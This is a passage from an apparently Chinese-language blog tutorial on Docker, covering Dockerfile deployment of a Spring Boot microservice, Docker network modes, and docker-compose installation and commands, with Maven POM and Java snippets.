        &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;!--test--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
        &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;

&lt;build&gt;
    &lt;plugins&gt;
        &lt;plugin&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
        &lt;/plugin&gt;
        &lt;plugin&gt;
            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
            &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;
            &lt;version&gt;3.1.0&lt;/version&gt;
        &lt;/plugin&gt;
    &lt;/plugins&gt;
&lt;/build&gt;
</code></pre>


<h3 id="1-3-写YML"><a href="#1-3-写YML" class="headerlink" title="1.3 写YML"></a>1.3 写YML</h3><p>server.port=6001</p>
<h3 id="1-4-主启动"><a href="#1-4-主启动" class="headerlink" title="1.4 主启动"></a>1.4 主启动</h3><p><img src="/2022/02/07/Docker/image-20220214214333463.png" alt="image-20220214214333463"></p>
<h3 id="1-5-业务类"><a href="#1-5-业务类" class="headerlink" title="1.5 业务类"></a>1.5 业务类</h3><p><img src="/2022/02/07/Docker/image-20220214214307334.png" alt="image-20220214214307334"></p>
<h2 id="二、通过dockerfile发布微服务部署到docker容器"><a href="#二、通过dockerfile发布微服务部署到docker容器" class="headerlink" title="二、通过dockerfile发布微服务部署到docker容器"></a>二、通过dockerfile发布微服务部署到docker容器</h2><h3 id="2-1-IDEA工具里面搞定微服务jar包"><a href="#2-1-IDEA工具里面搞定微服务jar包" class="headerlink" title="2.1 IDEA工具里面搞定微服务jar包"></a>2.1 IDEA工具里面搞定微服务jar包</h3><p><img src="/2022/02/07/Docker/image-20220214214526449.png" alt="image-20220214214526449"></p>
<h3 id="2-2-编写Dockerfile"><a href="#2-2-编写Dockerfile" class="headerlink" title="2.2 编写Dockerfile"></a>2.2 编写Dockerfile</h3><p>1、Dockerfile内容:</p>
<p># 基础镜像使用java</p>
<p>FROM java:8</p>
<p># 作者</p>
<p>MAINTAINER zzyy</p>
<p># VOLUME 指定临时文件目录为/tmp，在主机/var/lib/docker目录下创建了一个临时文件并链接到容器的/tmp</p>
<p>VOLUME /tmp</p>
<p># 将jar包添加到容器中并更名为zzyy_docker.jar</p>
<p>ADD docker_boot-0.0.1-SNAPSHOT.jar zzyy_docker.jar</p>
<p># 运行jar包</p>
<p>RUN bash -c ‘touch /zzyy_docker.jar’</p>
<p>ENTRYPOINT [“java”,”-jar”,”/zzyy_docker.jar”]</p>
<p>#暴露6001端口作为微服务</p>
<p>EXPOSE 6001</p>
<p>2、将微服务jar包和Dockerfile文件上传到同一个目录下/mydocker</p>
<p><img src="/2022/02/07/Docker/D9DA2D3B-44A0-4572-85A2-980416CA9C75.png" alt="img"></p>
<p>docker build -t zzyy_docker:1.6 .</p>
<h3 id="2-3-构建镜像"><a href="#2-3-构建镜像" class="headerlink" title="2.3 构建镜像"></a>2.3 构建镜像</h3><p><img src="/2022/02/07/Docker/52513024-9A73-4321-98DB-64C753ADB246.png" alt="img"></p>
<p>docker build -t zzyy_docker:1.6 .</p>
<p>打包成镜像文件</p>
<h3 id="2-4-运行容器"><a href="#2-4-运行容器" class="headerlink" title="2.4 运行容器"></a>2.4 运行容器</h3><p>docker run -d -p 6001:6001 zzyy_docker:1.6</p>
<p><img src="/2022/02/07/Docker/18397F6E-B9AF-43AC-91FE-8A6585212E91.png" alt="img"></p>
<h3 id="2-5-访问测试"><a href="#2-5-访问测试" class="headerlink" title="2.5 访问测试"></a>2.5 访问测试</h3><p><img src="/2022/02/07/Docker/E49E1238-9A52-4160-89EB-DE3D6BE1C1F6.png" alt="img"></p>
<h1 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h1><h2 id="一、是什么"><a href="#一、是什么" class="headerlink" title="一、是什么"></a>一、是什么</h2><h3 id="1-1-docker不启动，默认网络情况"><a href="#1-1-docker不启动，默认网络情况" class="headerlink" title="1.1 docker不启动，默认网络情况"></a>1.1 docker不启动，默认网络情况</h3><p><img src="/2022/02/07/Docker/29B449B5-D914-43D4-BFFB-8EE8C34FDE7E.png" alt="img"></p>
<p>ens33     lo      </p>
<p>virbr0:  在CentOS7的安装过程中如果有选择相关虚拟化的的服务安装系统后，启动网卡时会发现有一个以网桥连接的私网地址的virbr0网卡(virbr0网卡：它还有一个固定的默认IP地址192.168.122.1)，是做虚拟机网桥的使用的，其作用是为连接其上的虚机网卡提供 NAT访问外网的功能。</p>
<p>我们之前学习Linux安装，勾选安装系统的时候附带了libvirt服务才会生成的一个东西，如果不需要可以直接将libvirtd服务卸载，</p>
<p>yum remove libvirt-libs.x86_64</p>
<h3 id="1-2-docker启动后，网络情况"><a href="#1-2-docker启动后，网络情况" class="headerlink" title="1.2 docker启动后，网络情况"></a>1.2 docker启动后，网络情况</h3><p>会产生一个名为docker0的虚拟网桥</p>
<p><img src="/2022/02/07/Docker/265228C1-1058-4D2A-8913-49213AE14AC9.png" alt="img"></p>
<p>查看docker网络模式命令</p>
<p>默认创建3大网络模式</p>
<p><img src="/2022/02/07/Docker/9947C257-7E0D-44F4-9F6A-B6E2D7269C7E.png" alt="img"></p>
<h2 id="二、常用基本命令"><a href="#二、常用基本命令" class="headerlink" title="二、常用基本命令"></a>二、常用基本命令</h2><h3 id="2-1-All命令"><a href="#2-1-All命令" class="headerlink" title="2.1 All命令"></a>2.1 All命令</h3><p><img src="/2022/02/07/Docker/CBE2A55D-D620-4D22-B630-6AC0454B788D.png" alt="img"></p>
<h3 id="2-2-查看网络"><a href="#2-2-查看网络" class="headerlink" title="2.2 查看网络"></a>2.2 查看网络</h3><p>docker network ls</p>
<h3 id="2-3-查看网络源数据"><a href="#2-3-查看网络源数据" class="headerlink" title="2.3 查看网络源数据"></a>2.3 查看网络源数据</h3><p>docker network inspect  XXX网络名字</p>
<h3 id="2-4-删除网络"><a href="#2-4-删除网络" class="headerlink" title="2.4 删除网络"></a>2.4 删除网络</h3><p>docker network rm XXX网络名字</p>
<h3 id="2-5-案例"><a href="#2-5-案例" class="headerlink" title="2.5 案例"></a>2.5 案例</h3><p><img src="/2022/02/07/Docker/A0CDBD42-502B-4EAC-972D-82A1A8D2BAAB.png" alt="img"></p>
<h2 id="三、能干嘛"><a href="#三、能干嘛" class="headerlink" title="三、能干嘛"></a>三、能干嘛</h2><p>容器间的互联和通信以及端口映射</p>
<p>容器IP变动时候可以通过服务名直接网络通信而不受到影响</p>
<h2 id="四、网络模式"><a href="#四、网络模式" class="headerlink" title="四、网络模式"></a>四、网络模式</h2><h3 id="4-1-总体介绍"><a href="#4-1-总体介绍" class="headerlink" title="4.1 总体介绍"></a>4.1 总体介绍</h3><p><img src="/2022/02/07/Docker/40F942BD-8B84-49A2-94DD-68B577D6C9DE.png" alt="img"></p>
<p>bridge模式：使用–network  bridge指定，默认使用docker0</p>
<p>host模式：使用–network host指定</p>
<p>none模式：使用–network none指定</p>
<p>container模式：使用–network container:NAME或者容器ID指定</p>
<h3 id="4-2-容器实例内默认网络IP生产规则"><a href="#4-2-容器实例内默认网络IP生产规则" class="headerlink" title="4.2 容器实例内默认网络IP生产规则"></a>4.2 容器实例内默认网络IP生产规则</h3><p>说明:</p>
<p>1 先启动两个ubuntu容器实例</p>
<p><img src="/2022/02/07/Docker/7B5AEE43-A6A8-4204-9D69-6874C8B6B96D.png" alt="img"></p>
<p>2 docker inspect 容器ID or 容器名字</p>
<p><img src="/2022/02/07/Docker/82130325-1905-4ECE-85FE-A06CA0A7CE01.png" alt="img"></p>
<p>3 关闭u2实例，新建u3，查看ip变化</p>
<p><img src="/2022/02/07/Docker/5F3F3D67-5393-4917-874D-CF02A673BECB.png" alt="img"></p>
<p>结论:</p>
<p>docker容器内部的ip是有可能会发生改变的</p>
<h3 id="4-3-案例说明"><a href="#4-3-案例说明" class="headerlink" title="4.3 案例说明"></a>4.3 案例说明</h3><p>tomcat里安装ip等命令 <img src="/2022/02/07/Docker/image-20220215212041593.png" alt="image-20220215212041593"></p>
<p>(1)bridge</p>
<p><strong>是什么:</strong></p>
<p><img src="/2022/02/07/Docker/image-20220214222434567.png" alt="image-20220214222434567"></p>
<p><strong>案例:</strong></p>
<p>说明:<img src="/2022/02/07/Docker/image-20220214222539140.png" alt="image-20220214222539140"></p>
<p>代码:</p>
<p>docker run -d -p 8081:8080   –name tomcat81 billygoo/tomcat8-jdk8</p>
<p>docker run -d -p 8082:8080   –name tomcat82 billygoo/tomcat8-jdk8</p>
<p>两两匹配验证:</p>
<p><img src="/2022/02/07/Docker/image-20220214222712750.png" alt="image-20220214222712750"></p>
<p>(2)host</p>
<p><strong>是什么：直接使用宿主机的 IP 地址与外界进行通信，不再需要额外进行NAT 转换。</strong></p>
<p><strong>案例</strong>：</p>
<p>说明：<img src="/2022/02/07/Docker/image-20220214222910551.png" alt="image-20220214222910551"></p>
<p>代码:</p>
<p>警告:docker run -d -p 8083:8080 –network host –name tomcat83 billygoo/tomcat8-jdk8<img src="/2022/02/07/Docker/image-20220214223005037.png" alt="image-20220214223005037"></p>
<p>正确:docker run -d                          –network host –name tomcat83 billygoo/tomcat8-jdk8</p>
<p>无之前的配对显示了，看容器实例内部<img src="/2022/02/07/Docker/7BFB1C8C-7265-4A5D-AE3C-B1DF6CE652CF.png" alt="img"></p>
<p>没有设置-p的端口映射了，如何访问启动的tomcat83？？</p>
<p>http://宿主机IP:8080/           在CentOS里面用默认的火狐浏览器访问容器内的tomcat83看到访问成功，因为此时容器的IP借用主机的，所以容器共享宿主机网络IP，这样的好处是外部主机与容器可以直接通信。</p>
<p>(3)none</p>
<p><strong>是什么</strong>:在none模式下，并不为Docker容器进行任何网络配置。 </p>
<p>也就是说，这个Docker容器没有网卡、IP、路由等信息，只有一个lo</p>
<p>需要我们自己为Docker容器添加网卡、配置IP等。</p>
<p>禁用网络功能，只有lo标识(就是127.0.0.1表示本地回环)</p>
<p><strong>案例</strong></p>
<p>docker run -d -p 8084:8080 –network none –name tomcat84 billygoo/tomcat8-jdk8</p>
<p> 进入容器内部查看</p>
<p><img src="/2022/02/07/Docker/324D8C18-FD77-4562-B2A8-7792CF1FE4B9.png" alt="img"></p>
<p>在容器外部查看</p>
<p><img src="/2022/02/07/Docker/88E7B364-DACF-4379-BA36-B15EF3895937.png" alt="img"></p>
<p>(4)container</p>
<p><strong>是什么</strong><img src="/2022/02/07/Docker/image-20220214223534477.png" alt="image-20220214223534477"></p>
<p><strong>案例</strong> 错误了 ，看案例2</p>
<p>docker run -d -p 8085:8080                                     –name tomcat85 billygoo/tomcat8-jdk8</p>
<p>docker run -d -p 8086:8080 –network container:tomcat85 –name tomcat86 billygoo/tomcat8-jdk8</p>
<p><img src="/2022/02/07/Docker/image-20220214223703005.png" alt="image-20220214223703005"></p>
<p><strong>案例2</strong></p>
<p>Alpine操作系统是一个面向安全的轻型 Linux发行版</p>
<p>docker run -it                                                    –name alpine1  alpine /bin/sh</p>
<p>docker run -it –network container:alpine1 –name alpine2  alpine /bin/sh</p>
<p>运行结果，验证共用搭桥:<img src="/2022/02/07/Docker/46B3185D-DF05-4448-8FCE-33BEC9570B9A.png" alt="img"></p>
<p>假如此时关闭alpine1，再看看alpine2:<img src="/2022/02/07/Docker/image-20220214223845914.png" alt="image-20220214223845914"></p>
<p>(5)自定义网络</p>
<p>过时的link<img src="/2022/02/07/Docker/image-20220214223935643.png" alt="image-20220214223935643"></p>
<p><strong>案例</strong></p>
<p><strong>/1:before</strong></p>
<p>案例: docker run -d -p 8081:8080   –name tomcat81 billygoo/tomcat8-jdk8</p>
<p>docker run -d -p 8082:8080   –name tomcat82 billygoo/tomcat8-jdk8</p>
<p>上述成功启动并用docker exec进入各自容器实例内部</p>
<p>问题: </p>
<p>按照IP地址ping是OK的<img src="/2022/02/07/Docker/image-20220214224208772.png" alt="image-20220214224208772"></p>
<p>按照服务名ping结果???<img src="/2022/02/07/Docker/image-20220214224233954.png" alt="image-20220214224233954"></p>
<p><strong>/2: after</strong></p>
<p><strong>案例:</strong> </p>
<p>自定义桥接网络,自定义网络默认使用的是桥接网络bridge</p>
<p>新建自定义网络<img src="/2022/02/07/Docker/70F32650-CB77-4616-BF26-17E8221D7EED.png" alt="img"></p>
<p>新建容器加入上一步新建的自定义网络</p>
<p>docker run -d -p 8081:8080 –network zzyy_network  –name tomcat81 billygoo/tomcat8-jdk8</p>
<p>docker run -d -p 8082:8080 –network zzyy_network  –name tomcat82 billygoo/tomcat8-jdk8</p>
<p>互相ping测试<img src="/2022/02/07/Docker/image-20220214224434694.png" alt="image-20220214224434694"></p>
<p><strong>问题结论</strong></p>
<p><img src="/2022/02/07/Docker/image-20220214224527286.png" alt="image-20220214224527286"></p>
<h2 id="五、Docker平台架构图解"><a href="#五、Docker平台架构图解" class="headerlink" title="五、Docker平台架构图解"></a>五、Docker平台架构图解</h2><h3 id="5-1-整体说明"><a href="#5-1-整体说明" class="headerlink" title="5.1 整体说明"></a>5.1 整体说明</h3><p>从其架构和运行流程来看，Docker 是一个 C/S 模式的架构，后端是一个松耦合架构，众多模块各司其职。 </p>
<p>Docker 运行的基本流程为：</p>
<p>1 用户是使用 Docker Client 与 Docker Daemon 建立通信，并发送请求给后者。</p>
<p>2 Docker Daemon 作为 Docker 架构中的主体部分，首先提供 Docker Server 的功能使其可以接受 Docker Client 的请求。</p>
<p>3 Docker Engine 执行 Docker 内部的一系列工作，每一项工作都是以一个 Job 的形式的存在。</p>
<p>4 Job 的运行过程中，当需要容器镜像时，则从 Docker Registry 中下载镜像，并通过镜像管理驱动 Graph driver将下载镜像以Graph的形式存储。</p>
<p>5 当需要为 Docker 创建网络环境时，通过网络管理驱动 Network driver 创建并配置 Docker 容器网络环境。</p>
<p>6 当需要限制 Docker 容器运行资源或执行用户指令等操作时，则通过 Execdriver 来完成。</p>
<p>7 Libcontainer是一项独立的容器管理包，Network driver以及Exec driver都是通过Libcontainer来实现具体对容器进行的操作。</p>
<h3 id="5-2-整体架构"><a href="#5-2-整体架构" class="headerlink" title="5.2 整体架构"></a>5.2 整体架构</h3><p><img src="/2022/02/07/Docker/4C6BA163-ACC9-43C0-B173-2859C58E79F4.png" alt="img"></p>
<h1 id="Docker-compose容器编排"><a href="#Docker-compose容器编排" class="headerlink" title="Docker-compose容器编排"></a>Docker-compose容器编排</h1><h2 id="一、是什么-1"><a href="#一、是什么-1" class="headerlink" title="一、是什么"></a>一、是什么</h2><p>Compose 是 Docker 公司推出的一个工具软件，可以管理多个 Docker 容器组成一个应用。你需要定义一个 YAML 格式的配置文件docker-compose.yml，写好多个容器之间的调用关系。然后，只要一个命令，就能同时启动/关闭这些容器</p>
<p>Docker-Compose是Docker官方的开源项目，负责实现对Docker容器集群的快速编排。</p>
<h2 id="二、能干嘛"><a href="#二、能干嘛" class="headerlink" title="二、能干嘛"></a>二、能干嘛</h2><p> docker建议我们每一个容器中只运行一个服务,因为docker容器本身占用资源极少,所以最好是将每个服务单独的分割开来但是这样我们又面临了一个问题？</p>
<p>如果我需要同时部署好多个服务,难道要每个服务单独写Dockerfile然后在构建镜像,构建容器,这样累都累死了,所以docker官方给我们提供了docker-compose多服务部署的工具</p>
<p>例如要实现一个Web微服务项目，除了Web服务容器本身，往往还需要再加上后端的数据库mysql服务容器，redis服务器，注册中心eureka，甚至还包括负载均衡容器等等。。。。。。</p>
<p>Compose允许用户通过一个单独的docker-compose.yml模板文件（YAML 格式）来定义一组相关联的应用容器为一个项目（project）。</p>
<p>可以很容易地用一个配置文件定义一个多容器的应用，然后使用一条指令安装这个应用的所有依赖，完成构建。Docker-Compose 解决了容器与容器之间如何管理编排的问题。</p>
<h2 id="三、去哪下"><a href="#三、去哪下" class="headerlink" title="三、去哪下"></a>三、去哪下</h2><p>官网：<a target="_blank" rel="noopener" href="https://docs.docker.com/compose/compose-file/compose-file-v3/">https://docs.docker.com/compose/compose-file/compose-file-v3/</a></p>
<p>官网下载：<a target="_blank" rel="noopener" href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p>
<p>安装步骤：</p>
<p>curl -L “<a target="_blank" rel="noopener" href="https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$">https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$</a>(uname -s)-$(uname -m)” -o /usr/local/bin/docker-compose</p>
<p>chmod +x /usr/local/bin/docker-compose</p>
<p>docker-compose –version</p>
<p><img src="/2022/02/07/Docker/49A7AB4D-4D03-4D0E-8E00-E9283996DDFC.png" alt="img"></p>
<p>卸载步骤:<img src="/2022/02/07/Docker/18015F6C-029C-4236-9ACD-B0FC6B00DD76.png" alt="img"></p>
<h2 id="四、Compose核心概念"><a href="#四、Compose核心概念" class="headerlink" title="四、Compose核心概念"></a>四、Compose核心概念</h2><p>一文件：docker-compose.yml</p>
<p>两要素：</p>
<p>（1）服务（service）：一个个应用容器实例，比如订单微服务、库存微服务、mysql容器、nginx容器或者redis容器</p>
<p>（2）工程（project）：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。</p>
<h2 id="五、Compose使用的三个步骤"><a href="#五、Compose使用的三个步骤" class="headerlink" title="五、Compose使用的三个步骤"></a>五、Compose使用的三个步骤</h2><p>（1）编写Dockerfile定义各个微服务应用并构建出对应的镜像文件</p>
<p>（2）使用 docker-compose.yml 定义一个完整业务单元，安排好整体应用中的各个容器服务。</p>
<p>（3）最后，执行docker-compose up命令 来启动并运行整个应用程序，完成一键部署上线</p>
<h2 id="六、Compose常用命令"><a href="#六、Compose常用命令" class="headerlink" title="六、Compose常用命令"></a>六、Compose常用命令</h2><p>Compose常用命令</p>
<p>docker-compose -h              # 查看帮助</p>
<p>docker-compose up              # 启动所有docker-compose服务</p>
<p>docker-compose up -d             # 启动所有docker-compose服务并后台运行</p>
<p>docker-compose down             # 停止并删除容器、网络、卷、镜像。</p>
<p>docker-compose exec  yml里面的服务id         # 进入容器实例内部 docker-compose exec docker-compose.yml文件中写的服务id /bin/bash</p>
<p>docker-compose ps            # 展示当前docker-compose编排过的运行的所有容器</p>
<p>docker-compose top           # 展示当前docker-compose编排过的容器进程</p>
<p>docker-compose logs  yml里面的服务id   # 查看容器输出日志</p>
<p>docker-compose config   # 检查配置</p>
<p>docker-compose config -q # 检查配置，有问题才有输出</p>
<p>docker-compose restart  # 重启服务</p>
<p>docker-compose start   # 启动服务</p>
<p>docker-compose stop    # 停止服务</p>
<h2 id="七、Compose编排微服务"><a href="#七、Compose编排微服务" class="headerlink" title="七、Compose编排微服务"></a>七、Compose编排微服务</h2><h3 id="7-1-改造升级微服务工程docker-boot"><a href="#7-1-改造升级微服务工程docker-boot" class="headerlink" title="7.1 改造升级微服务工程docker_boot"></a>7.1 改造升级微服务工程docker_boot</h3><h4 id="1、以前的基础版"><a href="#1、以前的基础版" class="headerlink" title="1、以前的基础版"></a>1、以前的基础版<img src="/2022/02/07/Docker/7E62502B-1FE2-4A1D-B816-D83DD8306897.png" alt="img"></h4><h4 id="2、SQL建表建库"><a href="#2、SQL建表建库" class="headerlink" title="2、SQL建表建库"></a>2、SQL建表建库</h4><p><img src="/2022/02/07/Docker/image-20220215224905669.png" alt="image-20220215224905669"></p>
<h4 id="3、一键生成说明"><a href="#3、一键生成说明" class="headerlink" title="3、一键生成说明"></a>3、一键生成说明</h4><p><img src="/2022/02/07/Docker/image-20220216132141760.png" alt="image-20220216132141760"></p>
<p>生成的配置文件</p>
<p><img src="/2022/02/07/Docker/image-20220216132254045.png" alt="image-20220216132254045"></p>
<p>一键生成工具,双击<img src="/2022/02/07/Docker/image-20220216132711755.png" alt="image-20220216132711755"></p>
<p><img src="/2022/02/07/Docker/image-20220216132742677.png" alt="image-20220216132742677"></p>
<p><img src="/2022/02/07/Docker/image-20220216132848441.png" alt="image-20220216132848441"></p>
<h4 id="4、改POM"><a href="#4、改POM" class="headerlink" title="4、改POM"></a>4、改POM</h4><hr>
<?xml version="1.0" encoding="UTF-8"?>
<p><project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"><br>    <modelVersion>4.0.0</modelVersion><br>    <parent><br>        <groupId>org.springframework.boot</groupId><br>        <artifactId>spring-boot-starter-parent</artifactId><br>        <version>2.5.6</version><br>        <!--<version>2.3.10.RELEASE</version>--><br>        <relativePath> <!-- lookup parent from repository --><br>    </relativePath></parent></project></p>
<pre><code>&lt;groupId&gt;com.atguigu.docker&lt;/groupId&gt;
&lt;artifactId&gt;docker_boot&lt;/artifactId&gt;
&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;

&lt;properties&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
    &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;
    &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;
    &lt;junit.version&gt;4.12&lt;/junit.version&gt;
    &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt;
    &lt;lombok.version&gt;1.16.18&lt;/lombok.version&gt;
    &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt;
    &lt;druid.version&gt;1.1.16&lt;/druid.version&gt;
    &lt;mapper.version&gt;4.1.5&lt;/mapper.version&gt;
    &lt;mybatis.spring.boot.version&gt;1.3.0&lt;/mybatis.spring.boot.version&gt;
&lt;/properties&gt;

&lt;dependencies&gt;
    &lt;!--guava Google 开源的 Guava 中自带的布隆过滤器--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;com.google.guava&lt;/groupId&gt;
        &lt;artifactId&gt;guava&lt;/artifactId&gt;
        &lt;version&gt;23.0&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- redisson --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.redisson&lt;/groupId&gt;
        &lt;artifactId&gt;redisson&lt;/artifactId&gt;
        &lt;version&gt;3.13.4&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--SpringBoot通用依赖模块--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;!--swagger2--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;io.springfox&lt;/groupId&gt;
        &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;
        &lt;version&gt;2.9.2&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;io.springfox&lt;/groupId&gt;
        &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;
        &lt;version&gt;2.9.2&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--SpringBoot与Redis整合依赖--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;!--springCache--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;!--springCache连接池依赖包--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
        &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;!-- jedis --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;redis.clients&lt;/groupId&gt;
        &lt;artifactId&gt;jedis&lt;/artifactId&gt;
        &lt;version&gt;3.1.0&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--Mysql数据库驱动--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;mysql&lt;/groupId&gt;
        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
        &lt;version&gt;5.1.47&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--SpringBoot集成druid连接池--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
        &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;
        &lt;version&gt;1.1.10&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
        &lt;artifactId&gt;druid&lt;/artifactId&gt;
        &lt;version&gt;$&#123;druid.version&#125;&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--mybatis和springboot整合--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;
        &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;
        &lt;version&gt;$&#123;mybatis.spring.boot.version&#125;&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- 添加springboot对amqp的支持 --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;commons-codec&lt;/groupId&gt;
        &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;
        &lt;version&gt;1.10&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--通用基础配置junit/devtools/test/log4j/lombok/hutool--&gt;
    &lt;!--hutool--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;cn.hutool&lt;/groupId&gt;
        &lt;artifactId&gt;hutool-all&lt;/artifactId&gt;
        &lt;version&gt;5.2.3&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;junit&lt;/groupId&gt;
        &lt;artifactId&gt;junit&lt;/artifactId&gt;
        &lt;version&gt;$&#123;junit.version&#125;&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
        &lt;scope&gt;runtime&lt;/scope&gt;
        &lt;optional&gt;true&lt;/optional&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
        &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j&lt;/artifactId&gt;
        &lt;version&gt;$&#123;log4j.version&#125;&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
        &lt;artifactId&gt;lombok&lt;/artifactId&gt;
        &lt;version&gt;$&#123;lombok.version&#125;&lt;/version&gt;
        &lt;optional&gt;true&lt;/optional&gt;
    &lt;/dependency&gt;
    &lt;!--persistence--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;javax.persistence&lt;/groupId&gt;
        &lt;artifactId&gt;persistence-api&lt;/artifactId&gt;
        &lt;version&gt;1.0.2&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!--通用Mapper--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;tk.mybatis&lt;/groupId&gt;
        &lt;artifactId&gt;mapper&lt;/artifactId&gt;
        &lt;version&gt;$&#123;mapper.version&#125;&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;

&lt;build&gt;
    &lt;plugins&gt;
        &lt;plugin&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
        &lt;/plugin&gt;
        &lt;plugin&gt;
            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
            &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;
            &lt;version&gt;3.1.0&lt;/version&gt;
        &lt;/plugin&gt;
    &lt;/plugins&gt;
&lt;/build&gt;
</code></pre>


<hr>
<h4 id="5、写YML"><a href="#5、写YML" class="headerlink" title="5、写YML"></a>5、写YML</h4><p><img src="/2022/02/07/Docker/image-20220215225203972.png" alt="image-20220215225203972"></p>
<h4 id="6、主启动"><a href="#6、主启动" class="headerlink" title="6、主启动"></a>6、主启动</h4><p><img src="/2022/02/07/Docker/image-20220215225245733.png" alt="image-20220215225245733"></p>
<h4 id="7、业务类"><a href="#7、业务类" class="headerlink" title="7、业务类"></a>7、业务类</h4><p>（1）config配置类</p>
<ul>
<li>RedisConfig</li>
</ul>
<hr>
<p>package com.atguigu.docker.config;</p>
<p>import lombok.extern.slf4j.Slf4j;<br>import org.springframework.context.annotation.Bean;<br>import org.springframework.context.annotation.Configuration;<br>import org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;<br>import org.springframework.data.redis.core.RedisTemplate;<br>import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;<br>import org.springframework.data.redis.serializer.StringRedisSerializer;</p>
<p>import java.io.Serializable;</p>
